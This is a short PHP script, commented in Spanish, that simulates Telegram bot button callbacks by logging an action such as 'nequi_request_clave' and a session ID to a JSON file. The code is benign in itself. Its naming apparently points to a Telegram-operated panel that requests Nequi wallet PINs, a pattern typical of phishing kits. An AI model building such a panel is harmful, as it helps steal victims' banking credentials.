<?php

// Script para simular callback de Telegram (presionar botones)
// Uso: ?action=nequi_request_clave&session=SESSION_ID

header('Content-Type: application/json');

$action = $_GET['action'] ?? '';
$sessionId = $_GET['session'] ?? '';

if (!$action || !$sessionId) {
    http_response_code(400);
    echo json_encode([
        'error' => 'Se requieren parámetros: action y session',
        'usage' => 'simulate-callback.php?action=nequi_request_clave&session=SESSION_ID'
    ]);
    exit;
}

// Guardar la acción simulada
$sessionFile = __DIR__ . '/../../storage/telegram_actions.json';

$actions = [];
if (file_exists($sessionFile)) {
    $actions = json_decode(file_get_contents($sessionFile), true) ?? [];
}

$actions[] = [
    'action' => $action,
    'session_id' => $sessionId,
    'timestamp' => time(),
    'callback_query_id' => 'simulated_' . uniqid(),
    'simulated' => true
];

// Mantener solo las últimas 100 acciones
if (count($actions) > 100) {
    $actions = array_slice($actions, -100);
}

file_put_contents($sessionFile, json_encode($actions, JSON_PRETTY_PRINT));

echo json_encode([
    'success' => true,
    'message' => 'Callback simulado exitosamente',
    'action' => $action,
    'session_id' => $sessionId,
    'timestamp' => time()
], JSON_PRETTY_PRINT);
